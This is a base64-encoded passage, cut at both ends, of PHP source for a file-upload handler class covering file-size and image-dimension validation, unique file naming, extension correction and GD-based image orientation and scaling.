fHwKICAgICAgICAgICAgICAgICRmaWxlLT5zaXplID4gJHRoaXMtPm9wdGlvbnNbJ21heF9maWxlX3NpemUnXSkKICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICRmaWxlLT5lcnJvciA9ICR0aGlzLT5nZXRfZXJyb3JfbWVzc2FnZSgnbWF4X2ZpbGVfc2l6ZScpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+b3B0aW9uc1snbWluX2ZpbGVfc2l6ZSddICYmCiAgICAgICAgICAgICRmaWxlX3NpemUgPCAkdGhpcy0+b3B0aW9uc1snbWluX2ZpbGVfc2l6ZSddKSB7CiAgICAgICAgICAgICRmaWxlLT5lcnJvciA9ICR0aGlzLT5nZXRfZXJyb3JfbWVzc2FnZSgnbWluX2ZpbGVfc2l6ZScpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIGlmIChpc19pbnQoJHRoaXMtPm9wdGlvbnNbJ21heF9udW1iZXJfb2ZfZmlsZXMnXSkgJiYKICAgICAgICAgICAgICAgICgkdGhpcy0+Y291bnRfZmlsZV9vYmplY3RzKCkgPj0gJHRoaXMtPm9wdGlvbnNbJ21heF9udW1iZXJfb2ZfZmlsZXMnXSkgJiYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAhaXNfZmlsZSgkdGhpcy0+Z2V0X3VwbG9hZF9wYXRoKCRmaWxlLT5uYW1lKSkpIHsKICAgICAgICAgICAgJGZpbGUtPmVycm9yID0gJHRoaXMtPmdldF9lcnJvcl9tZXNzYWdlKCdtYXhfbnVtYmVyX29mX2ZpbGVzJyk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJG1heF93aWR0aCA9IEAkdGhpcy0+b3B0aW9uc1snbWF4X3dpZHRoJ107CiAgICAgICAgJG1heF9oZWlnaHQgPSBAJHRoaXMtPm9wdGlvbnNbJ21heF9oZWlnaHQnXTsKICAgICAgICAkbWluX3dpZHRoID0gQCR0aGlzLT5vcHRpb25zWydtaW5fd2lkdGgnXTsKICAgICAgICAkbWluX2hlaWdodCA9IEAkdGhpcy0+b3B0aW9uc1snbWluX2hlaWdodCddOwogICAgICAgIGlmICgoJG1heF93aWR0aCB8fCAkbWF4X2hlaWdodCB8fCAkbWluX3dpZHRoIHx8ICRtaW5faGVpZ2h0KQogICAgICAgICAgICYmIHByZWdfbWF0Y2goJHRoaXMtPm9wdGlvbnNbJ2ltYWdlX2ZpbGVfdHlwZXMnXSwgJGZpbGUtPm5hbWUpKSB7CiAgICAgICAgICAgIGxpc3QoJGltZ193aWR0aCwgJGltZ19oZWlnaHQpID0gJHRoaXMtPmdldF9pbWFnZV9zaXplKCR1cGxvYWRlZF9maWxlKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgIEAkdGhpcy0+b3B0aW9uc1snaW1hZ2VfdmVyc2lvbnMnXVsnJ11bJ2F1dG9fb3JpZW50J10gJiYKICAgICAgICAgICAgICAgIGZ1bmN0aW9uX2V4aXN0cygnZXhpZl9yZWFkX2RhdGEnKSAmJgogICAgICAgICAgICAgICAgKCRleGlmID0gQGV4aWZfcmVhZF9kYXRhKCR1cGxvYWRlZF9maWxlKSkgJiYKICAgICAgICAgICAgICAgICgoKGludCkgQCRleGlmWydPcmllbnRhdGlvbiddKSA+PSA1KQogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICR0bXAgPSAkaW1nX3dpZHRoOwogICAgICAgICAgICAgICAgJGltZ193aWR0aCA9ICRpbWdfaGVpZ2h0OwogICAgICAgICAgICAgICAgJGltZ19oZWlnaHQgPSAkdG1wOwogICAgICAgICAgICAgICAgdW5zZXQoJHRtcCk7CiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgICAgIGlmICghZW1wdHkoJGltZ193aWR0aCkpIHsKICAgICAgICAgICAgaWYgKCRtYXhfd2lkdGggJiYgJGltZ193aWR0aCA+ICRtYXhfd2lkdGgpIHsKICAgICAgICAgICAgICAgICRmaWxlLT5lcnJvciA9ICR0aGlzLT5nZXRfZXJyb3JfbWVzc2FnZSgnbWF4X3dpZHRoJyk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRtYXhfaGVpZ2h0ICYmICRpbWdfaGVpZ2h0ID4gJG1heF9oZWlnaHQpIHsKICAgICAgICAgICAgICAgICRmaWxlLT5lcnJvciA9ICR0aGlzLT5nZXRfZXJyb3JfbWVzc2FnZSgnbWF4X2hlaWdodCcpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkbWluX3dpZHRoICYmICRpbWdfd2lkdGggPCAkbWluX3dpZHRoKSB7CiAgICAgICAgICAgICAgICAkZmlsZS0+ZXJyb3IgPSAkdGhpcy0+Z2V0X2Vycm9yX21lc3NhZ2UoJ21pbl93aWR0aCcpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkbWluX2hlaWdodCAmJiAkaW1nX2hlaWdodCA8ICRtaW5faGVpZ2h0KSB7CiAgICAgICAgICAgICAgICAkZmlsZS0+ZXJyb3IgPSAkdGhpcy0+Z2V0X2Vycm9yX21lc3NhZ2UoJ21pbl9oZWlnaHQnKTsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gdXBjb3VudF9uYW1lX2NhbGxiYWNrKCRtYXRjaGVzKSB7CiAgICAgICAgJGluZGV4ID0gaXNzZXQoJG1hdGNoZXNbMV0pID8gKChpbnQpJG1hdGNoZXNbMV0pICsgMSA6IDE7CiAgICAgICAgJGV4dCA9IGlzc2V0KCRtYXRjaGVzWzJdKSA/ICRtYXRjaGVzWzJdIDogJyc7CiAgICAgICAgcmV0dXJuICcgKCcuJGluZGV4LicpJy4kZXh0OwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiB1cGNvdW50X25hbWUoJG5hbWUpIHsKICAgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlX2NhbGxiYWNrKAogICAgICAgICAgICAnLyg/Oig/OiBcKChbXGRdKylcKSk/KFwuW14uXSspKT8kLycsCiAgICAgICAgICAgIGFycmF5KCR0aGlzLCAndXBjb3VudF9uYW1lX2NhbGxiYWNrJyksCiAgICAgICAgICAgICRuYW1lLAogICAgICAgICAgICAxCiAgICAgICAgKTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X3VuaXF1ZV9maWxlbmFtZSgkZmlsZV9wYXRoLCAkbmFtZSwgJHNpemUsICR0eXBlLCAkZXJyb3IsCiAgICAgICAgICAgICRpbmRleCwgJGNvbnRlbnRfcmFuZ2UpIHsKICAgICAgICB3aGlsZShpc19kaXIoJHRoaXMtPmdldF91cGxvYWRfcGF0aCgkbmFtZSkpKSB7CiAgICAgICAgICAgICRuYW1lID0gJHRoaXMtPnVwY291bnRfbmFtZSgkbmFtZSk7CiAgICAgICAgfQogICAgICAgICAgICAgICAgJHVwbG9hZGVkX2J5dGVzID0gJHRoaXMtPmZpeF9pbnRlZ2VyX292ZXJmbG93KChpbnQpJGNvbnRlbnRfcmFuZ2VbMV0pOwogICAgICAgIHdoaWxlIChpc19maWxlKCR0aGlzLT5nZXRfdXBsb2FkX3BhdGgoJG5hbWUpKSkgewogICAgICAgICAgICBpZiAoJHVwbG9hZGVkX2J5dGVzID09PSAkdGhpcy0+Z2V0X2ZpbGVfc2l6ZSgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Z2V0X3VwbG9hZF9wYXRoKCRuYW1lKSkpIHsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRuYW1lID0gJHRoaXMtPnVwY291bnRfbmFtZSgkbmFtZSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkbmFtZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZml4X2ZpbGVfZXh0ZW5zaW9uKCRmaWxlX3BhdGgsICRuYW1lLCAkc2l6ZSwgJHR5cGUsICRlcnJvciwKICAgICAgICAgICAgJGluZGV4LCAkY29udGVudF9yYW5nZSkgewogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkbmFtZSwgJy4nKSA9PT0gZmFsc2UgJiYKICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goJy9eaW1hZ2VcLyhnaWZ8anBlP2d8cG5nKS8nLCAkdHlwZSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgICRuYW1lIC49ICcuJy4kbWF0Y2hlc1sxXTsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5vcHRpb25zWydjb3JyZWN0X2ltYWdlX2V4dGVuc2lvbnMnXSAmJgogICAgICAgICAgICAgICAgZnVuY3Rpb25fZXhpc3RzKCdleGlmX2ltYWdldHlwZScpKSB7CiAgICAgICAgICAgIHN3aXRjaCAoQGV4aWZfaW1hZ2V0eXBlKCRmaWxlX3BhdGgpKXsKICAgICAgICAgICAgICAgIGNhc2UgSU1BR0VUWVBFX0pQRUc6CiAgICAgICAgICAgICAgICAgICAgJGV4dGVuc2lvbnMgPSBhcnJheSgnanBnJywgJ2pwZWcnKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgSU1BR0VUWVBFX1BORzoKICAgICAgICAgICAgICAgICAgICAkZXh0ZW5zaW9ucyA9IGFycmF5KCdwbmcnKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgSU1BR0VUWVBFX0dJRjoKICAgICAgICAgICAgICAgICAgICAkZXh0ZW5zaW9ucyA9IGFycmF5KCdnaWYnKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRleHRlbnNpb25zKSkgewogICAgICAgICAgICAgICAgJHBhcnRzID0gZXhwbG9kZSgnLicsICRuYW1lKTsKICAgICAgICAgICAgICAgICRleHRJbmRleCA9IGNvdW50KCRwYXJ0cykgLSAxOwogICAgICAgICAgICAgICAgJGV4dCA9IHN0cnRvbG93ZXIoQCRwYXJ0c1skZXh0SW5kZXhdKTsKICAgICAgICAgICAgICAgIGlmICghaW5fYXJyYXkoJGV4dCwgJGV4dGVuc2lvbnMpKSB7CiAgICAgICAgICAgICAgICAgICAgJHBhcnRzWyRleHRJbmRleF0gPSAkZXh0ZW5zaW9uc1swXTsKICAgICAgICAgICAgICAgICAgICAkbmFtZSA9IGltcGxvZGUoJy4nLCAkcGFydHMpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkbmFtZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gdHJpbV9maWxlX25hbWUoJGZpbGVfcGF0aCwgJG5hbWUsICRzaXplLCAkdHlwZSwgJGVycm9yLAogICAgICAgICAgICAkaW5kZXgsICRjb250ZW50X3JhbmdlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG5hbWUgPSB0cmltKCR0aGlzLT5iYXNlbmFtZShzdHJpcHNsYXNoZXMoJG5hbWUpKSwgIi5ceDAwLi5ceDIwIik7CiAgICAgICAgICAgICAgICBpZiAoISRuYW1lKSB7CiAgICAgICAgICAgICRuYW1lID0gc3RyX3JlcGxhY2UoJy4nLCAnLScsIG1pY3JvdGltZSh0cnVlKSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkbmFtZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X2ZpbGVfbmFtZSgkZmlsZV9wYXRoLCAkbmFtZSwgJHNpemUsICR0eXBlLCAkZXJyb3IsCiAgICAgICAgICAgICRpbmRleCwgJGNvbnRlbnRfcmFuZ2UpIHsKICAgICAgICAkbmFtZSA9ICR0aGlzLT50cmltX2ZpbGVfbmFtZSgkZmlsZV9wYXRoLCAkbmFtZSwgJHNpemUsICR0eXBlLCAkZXJyb3IsCiAgICAgICAgICAgICRpbmRleCwgJGNvbnRlbnRfcmFuZ2UpOwogICAgICAgIHJldHVybiAkdGhpcy0+Z2V0X3VuaXF1ZV9maWxlbmFtZSgKICAgICAgICAgICAgJGZpbGVfcGF0aCwKICAgICAgICAgICAgJHRoaXMtPmZpeF9maWxlX2V4dGVuc2lvbigkZmlsZV9wYXRoLCAkbmFtZSwgJHNpemUsICR0eXBlLCAkZXJyb3IsCiAgICAgICAgICAgICAgICAkaW5kZXgsICRjb250ZW50X3JhbmdlKSwKICAgICAgICAgICAgJHNpemUsCiAgICAgICAgICAgICR0eXBlLAogICAgICAgICAgICAkZXJyb3IsCiAgICAgICAgICAgICRpbmRleCwKICAgICAgICAgICAgJGNvbnRlbnRfcmFuZ2UKICAgICAgICApOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfc2NhbGVkX2ltYWdlX2ZpbGVfcGF0aHMoJGZpbGVfbmFtZSwgJHZlcnNpb24pIHsKICAgICAgICAkZmlsZV9wYXRoID0gJHRoaXMtPmdldF91cGxvYWRfcGF0aCgkZmlsZV9uYW1lKTsKICAgICAgICBpZiAoIWVtcHR5KCR2ZXJzaW9uKSkgewogICAgICAgICAgICAkdmVyc2lvbl9kaXIgPSAkdGhpcy0+Z2V0X3VwbG9hZF9wYXRoKG51bGwsICR2ZXJzaW9uKTsKICAgICAgICAgICAgaWYgKCFpc19kaXIoJHZlcnNpb25fZGlyKSkgewogICAgICAgICAgICAgICAgbWtkaXIoJHZlcnNpb25fZGlyLCAkdGhpcy0+b3B0aW9uc1snbWtkaXJfbW9kZSddLCB0cnVlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkbmV3X2ZpbGVfcGF0aCA9ICR2ZXJzaW9uX2Rpci4nLycuJGZpbGVfbmFtZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbmV3X2ZpbGVfcGF0aCA9ICRmaWxlX3BhdGg7CiAgICAgICAgfQogICAgICAgIHJldHVybiBhcnJheSgkZmlsZV9wYXRoLCAkbmV3X2ZpbGVfcGF0aCk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdkX2dldF9pbWFnZV9vYmplY3QoJGZpbGVfcGF0aCwgJGZ1bmMsICRub19jYWNoZSA9IGZhbHNlKSB7CiAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT5pbWFnZV9vYmplY3RzWyRmaWxlX3BhdGhdKSB8fCAkbm9fY2FjaGUpIHsKICAgICAgICAgICAgJHRoaXMtPmdkX2Rlc3Ryb3lfaW1hZ2Vfb2JqZWN0KCRmaWxlX3BhdGgpOwogICAgICAgICAgICAkdGhpcy0+aW1hZ2Vfb2JqZWN0c1skZmlsZV9wYXRoXSA9ICRmdW5jKCRmaWxlX3BhdGgpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPmltYWdlX29iamVjdHNbJGZpbGVfcGF0aF07CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdkX3NldF9pbWFnZV9vYmplY3QoJGZpbGVfcGF0aCwgJGltYWdlKSB7CiAgICAgICAgJHRoaXMtPmdkX2Rlc3Ryb3lfaW1hZ2Vfb2JqZWN0KCRmaWxlX3BhdGgpOwogICAgICAgICR0aGlzLT5pbWFnZV9vYmplY3RzWyRmaWxlX3BhdGhdID0gJGltYWdlOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZF9kZXN0cm95X2ltYWdlX29iamVjdCgkZmlsZV9wYXRoKSB7CiAgICAgICAgJGltYWdlID0gKGlzc2V0KCR0aGlzLT5pbWFnZV9vYmplY3RzWyRmaWxlX3BhdGhdKSkgPyAkdGhpcy0+aW1hZ2Vfb2JqZWN0c1skZmlsZV9wYXRoXSA6IG51bGwgOwogICAgICAgIHJldHVybiAkaW1hZ2UgJiYgaW1hZ2VkZXN0cm95KCRpbWFnZSk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdkX2ltYWdlZmxpcCgkaW1hZ2UsICRtb2RlKSB7CiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnaW1hZ2VmbGlwJykpIHsKICAgICAgICAgICAgcmV0dXJuIGltYWdlZmxpcCgkaW1hZ2UsICRtb2RlKTsKICAgICAgICB9CiAgICAgICAgJG5ld193aWR0aCA9ICRzcmNfd2lkdGggPSBpbWFnZXN4KCRpbWFnZSk7CiAgICAgICAgJG5ld19oZWlnaHQgPSAkc3JjX2hlaWdodCA9IGltYWdlc3koJGltYWdlKTsKICAgICAgICAkbmV3X2ltZyA9IGltYWdlY3JlYXRldHJ1ZWNvbG9yKCRuZXdfd2lkdGgsICRuZXdfaGVpZ2h0KTsKICAgICAgICAkc3JjX3ggPSAwOwogICAgICAgICRzcmNfeSA9IDA7CiAgICAgICAgc3dpdGNoICgkbW9kZSkgewogICAgICAgICAgICBjYXNlICcxJzogICAgICAgICAgICAgICAgICRzcmNfeSA9ICRuZXdfaGVpZ2h0IC0gMTsKICAgICAgICAgICAgICAgICRzcmNfaGVpZ2h0ID0gLSRuZXdfaGVpZ2h0OwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJzInOiAgICAgICAgICAgICAgICAgJHNyY194ICA9ICRuZXdfd2lkdGggLSAxOwogICAgICAgICAgICAgICAgJHNyY193aWR0aCA9IC0kbmV3X3dpZHRoOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJzMnOiAgICAgICAgICAgICAgICAgJHNyY195ID0gJG5ld19oZWlnaHQgLSAxOwogICAgICAgICAgICAgICAgJHNyY19oZWlnaHQgPSAtJG5ld19oZWlnaHQ7CiAgICAgICAgICAgICAgICAkc3JjX3ggID0gJG5ld193aWR0aCAtIDE7CiAgICAgICAgICAgICAgICAkc3JjX3dpZHRoID0gLSRuZXdfd2lkdGg7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIHJldHVybiAkaW1hZ2U7CiAgICAgICAgfQogICAgICAgIGltYWdlY29weXJlc2FtcGxlZCgKICAgICAgICAgICAgJG5ld19pbWcsCiAgICAgICAgICAgICRpbWFnZSwKICAgICAgICAgICAgMCwKICAgICAgICAgICAgMCwKICAgICAgICAgICAgJHNyY194LAogICAgICAgICAgICAkc3JjX3ksCiAgICAgICAgICAgICRuZXdfd2lkdGgsCiAgICAgICAgICAgICRuZXdfaGVpZ2h0LAogICAgICAgICAgICAkc3JjX3dpZHRoLAogICAgICAgICAgICAkc3JjX2hlaWdodAogICAgICAgICk7CiAgICAgICAgcmV0dXJuICRuZXdfaW1nOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZF9vcmllbnRfaW1hZ2UoJGZpbGVfcGF0aCwgJHNyY19pbWcpIHsKICAgICAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnZXhpZl9yZWFkX2RhdGEnKSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRleGlmID0gQGV4aWZfcmVhZF9kYXRhKCRmaWxlX3BhdGgpOwogICAgICAgIGlmICgkZXhpZiA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkb3JpZW50YXRpb24gPSAoaW50KUAkZXhpZlsnT3JpZW50YXRpb24nXTsKICAgICAgICBpZiAoJG9yaWVudGF0aW9uIDwgMiB8fCAkb3JpZW50YXRpb24gPiA4KSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgc3dpdGNoICgkb3JpZW50YXRpb24pIHsKICAgICAgICAgICAgY2FzZSAyOgogICAgICAgICAgICAgICAgJG5ld19pbWcgPSAkdGhpcy0+Z2RfaW1hZ2VmbGlwKAogICAgICAgICAgICAgICAgICAgICRzcmNfaW1nLAogICAgICAgICAgICAgICAgICAgIGRlZmluZWQoJ0lNR19GTElQX1ZFUlRJQ0FMJykgPyBJTUdfRkxJUF9WRVJUSUNBTCA6IDIKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgJG5ld19pbWcgPSBpbWFnZXJvdGF0ZSgkc3JjX2ltZywgMTgwLCAwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAkbmV3X2ltZyA9ICR0aGlzLT5nZF9pbWFnZWZsaXAoCiAgICAgICAgICAgICAgICAgICAgJHNyY19pbWcsCiAgICAgICAgICAgICAgICAgICAgZGVmaW5lZCgnSU1HX0ZMSVBfSE9SSVpPTlRBTCcpID8gSU1HX0ZMSVBfSE9SSVpPTlRBTCA6IDEKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSA1OgogICAgICAgICAgICAgICAgJHRtcF9pbWcgPSAkdGhpcy0+Z2RfaW1hZ2VmbGlwKAogICAgICAgICAgICAgICAgICAgICRzcmNfaW1nLAogICAgICAgICAgICAgICAgICAgIGRlZmluZWQoJ0lNR19GTElQX0hPUklaT05UQUwnKSA/IElNR19GTElQX0hPUklaT05UQUwgOiAxCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgJG5ld19pbWcgPSBpbWFnZXJvdGF0ZSgkdG1wX2ltZywgMjcwLCAwKTsKICAgICAgICAgICAgICAgIGltYWdlZGVzdHJveSgkdG1wX2ltZyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSA2OgogICAgICAgICAgICAgICAgJG5ld19pbWcgPSBpbWFnZXJvdGF0ZSgkc3JjX2ltZywgMjcwLCAwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlIDc6CiAgICAgICAgICAgICAgICAkdG1wX2ltZyA9ICR0aGlzLT5nZF9pbWFnZWZsaXAoCiAgICAgICAgICAgICAgICAgICAgJHNyY19pbWcsCiAgICAgICAgICAgICAgICAgICAgZGVmaW5lZCgnSU1HX0ZMSVBfVkVSVElDQUwnKSA/IElNR19GTElQX1ZFUlRJQ0FMIDogMgogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICRuZXdfaW1nID0gaW1hZ2Vyb3RhdGUoJHRtcF9pbWcsIDI3MCwgMCk7CiAgICAgICAgICAgICAgICBpbWFnZWRlc3Ryb3koJHRtcF9pbWcpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgODoKICAgICAgICAgICAgICAgICRuZXdfaW1nID0gaW1hZ2Vyb3RhdGUoJHNyY19pbWcsIDkwLCAwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+Z2Rfc2V0X2ltYWdlX29iamVjdCgkZmlsZV9wYXRoLCAkbmV3X2ltZyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGdkX2NyZWF0ZV9zY2FsZWRfaW1hZ2UoJGZpbGVfbmFtZSwgJHZlcnNpb24sICRvcHRpb25zKSB7CiAgICAgICAgaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2ltYWdlY3JlYXRldHJ1ZWNvbG9yJykpIHsKICAgICAgICAgICAgZXJyb3JfbG9nKCdGdW5jdGlvbiBub3QgZm91bmQ6IGltYWdlY3JlYXRldHJ1ZWNvbG9yJyk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgbGlzdCgkZmlsZV9wYXRoLCAkbmV3X2ZpbGVfcGF0aCkgPQogICAgICAgICAgICAkdGhpcy0+Z2V0X3NjYWxlZF9pbWFnZV9maWxlX3BhdGhzKCRmaWxlX25hbWUsICR2ZXJzaW9uKTsKICAgICAgICAkdHlwZSA9IHN0cnRvbG93ZXIoc3Vic3RyKHN0cnJjaHIoJGZpbGVfbmFtZSwgJy4nKSwgMSkpOwogICAgICAgIHN3aXRjaCAoJHR5cGUpIHsKICAgICAgICAgICAgY2FzZSAnanBnJzoKICAgICAgICAgICAgY2FzZSAnanBlZyc6CiAgICAgICAgICAgICAgICAkc3JjX2Z1bmMgPSAnaW1hZ2VjcmVhdGVmcm9tanBlZyc7CiAgICAgICAgICAgICAgICAkd3JpdGVfZnVuYyA9ICdpbWFnZWpwZWcnOwogICAgICAgICAgICAgICAgJGltYWdlX3F1YWxpdHkgPSBpc3NldCgkb3B0aW9uc1snanBlZ19xdWFsaXR5J10pID8KICAgICAgICAgICAgICAgICAgICAkb3B0aW9uc1snanBlZ19xdWFsaXR5J10gOiA3NTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdnaWYnOgogICAgICAgICAgICAgICAgJHNyY19mdW5jID0gJ2ltYWdlY3JlYXRlZnJvbWdpZic7CiAgICAgICAgICAgICAgICAkd3JpdGVfZnVuYyA9ICdpbWFnZWdpZic7CiAgICAgICAgICAgICAgICAkaW1hZ2VfcXVhbGl0eSA9IG51bGw7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAncG5nJzoKICAgICAgICAgICAgICAgICRzcmNfZnVuYyA9ICdpbWFnZWNyZWF0ZWZyb21wbmcnOwogICAgICAgICAgICAgICAgJHdyaXRlX2Z1bmMgPSAnaW1hZ2VwbmcnOwogICAgICAgICAgICAgICAgJGltYWdlX3F1YWxpdHkgPSBpc3NldCgkb3B0aW9uc1sncG5nX3F1YWxpdHknXSkgPwogICAgICAgICAgICAgICAgICAgICRvcHRpb25zWydwbmdfcXVhbGl0eSddIDogOTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkc3JjX2ltZyA9ICR0aGlzLT5nZF9nZXRfaW1hZ2Vfb2JqZWN0KAogICAgICAgICAgICAkZmlsZV9wYXRoLAogICAgICAgICAgICAkc3JjX2Z1bmMsCiAgICAgICAgICAgICFlbXB0eSgkb3B0aW9uc1snbm9fY2FjaGUnXSkKICAgICAgICApOwogICAgICAgICRpbWFnZV9vcmllbnRlZCA9IGZhbHNlOwogICAgICAgIGlmICghZW1wdHkoJG9wdGlvbnNbJ2F1dG9fb3JpZW50J10pICYmICR0aGlzLT5nZF9vcmllbnRfaW1hZ2UoCiAgICAgICAgICAgICAgICAkZmlsZV9wYXRoLAogICAgICAgICAgICAgICAgJHNyY19pbWcKICAgICAgICAgICAgKSkgewogICAgICAgICAgICAkaW1hZ2Vfb3JpZW50ZWQgPSB0cnVlOwogICAgICAgICAgICAkc3JjX2ltZyA9ICR0aGlzLT5nZF9nZXRfaW1hZ2Vfb2JqZWN0KAogICAgICAgICAgICAgICAgJGZpbGVfcGF0aCwKICAgICAgICAgICAgICAgICRzcmNfZnVuYwogICAgICAgICAgICApOwogICAgICAgIH0KICAgICAgICAkbWF4X3dpZHRoID0gJGltZ193aWR0aCA9IGltYWdlc3goJHNyY19pbWcpOwogICAgICAgICRtYXhfaGVpZ2h0ID0gJGltZ19oZWlnaHQgPSBpbWFnZXN5KCRzcmNfaW1nKTsKICAgICAgICBpZiAoIWVtcHR5KCRvcHRpb25zWydtYXhfd2lkdGgnXSkpIHsKICAgICAgICAgICAgJG1heF93aWR0aCA9ICRvcHRpb25zWydtYXhfd2lkdGgnXTsKICAgICAgICB9CiAgICAgICAgaWYgKCFlbXB0eSgkb3B0aW9uc1snbWF4X2hlaWdodCddKSkgewogICAgICAgICAgICAkbWF4X2hlaWdodCA9ICRvcHRpb25zWydtYXhfaGVpZ2h0J107CiAgICAgICAgfQogICAgICAgICRzY2FsZSA9IG1pbigKICAgICAgICAgICAgJG1heF93aWR0aCAvICRpbWdfd2lkdGgsCiAgICAgICAgICAgICRtYXhfaGVpZ2h0IC8gJGltZ19oZWlnaHQKICAgICAgICApOwogICAgICAgIGlmICgkc2NhbGUgPj0gMSkgewogICAgICAgICAgICBpZiAoJGltYWdlX29yaWVudGVkKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gJHdyaXRlX2Z1bmMoJHNyY19pbWcsICRuZXdfZmlsZV9wYXRoLCAkaW1hZ2VfcXVhbGl0eSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRmaWxlX3BhdGggIT09ICRuZXdfZmlsZV9wYXRoKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gY29weSgkZmlsZV9wYXRoLCAkbmV3X2ZpbGVfcGF0aCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIGlmIChlbXB0eSgkb3B0aW9uc1snY3JvcCddKSkgewogICAgICAgICAgICAkbmV3X3dpZHRoID0gJGltZ193aWR0aCAqICRzY2FsZ